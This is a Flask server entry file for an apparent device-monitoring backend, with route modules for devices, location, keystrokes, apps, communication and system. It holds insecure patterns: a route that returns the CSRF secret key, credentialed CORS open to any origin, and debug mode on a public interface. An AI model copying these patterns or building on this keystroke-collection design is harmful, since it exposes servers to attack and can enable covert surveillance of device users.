import sys
import os

# Get the project root directory (one level up from 'admin')
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, PROJECT_ROOT)  # ✅ Add project root to Python's path

from flask import Flask, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_limiter import Limiter
from flask_cors import CORS
from flask_seasurf import SeaSurf
import os
from dotenv import load_dotenv
from config.database import db, init_app
from apis.routes import devices, location, keystrokes, apps, communication, system
# Models
from models.devices import *

load_dotenv()

app = Flask(__name__)
app.config["SECRET_KEY"] = os.getenv("SECRET_KEY")
app.config["WTF_CSRF_SECRET_KEY "] = os.getenv("CSRF_SECRET_KEY")
app.config["SQLALCHEMY_DATABASE_URI"] = os.getenv("DATABASE_URI")
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
app.config["SESSION_COOKIE_HTTPONLY"] = True  # Secure cookies
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"  # Required for CSRF protection

init_app(app)

CORS(app, supports_credentials=True)
csrf = SeaSurf(app)
limiter = Limiter(app)

@app.route("/csrf-token-get-route-only-nithindev", methods=["GET"])
def get_csrf_token():
    return jsonify({"csrf_token": os.getenv("CSRF_SECRET_KEY")})

# Application blueprints

app.register_blueprint(devices.devices_bp)
app.register_blueprint(location.location_bp)
app.register_blueprint(keystrokes.keystrokes_bp)
app.register_blueprint(apps.apps_bp)
app.register_blueprint(communication.communication_bp)
app.register_blueprint(system.system_bp)

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(debug=True, host="0.0.0.0", port=8000)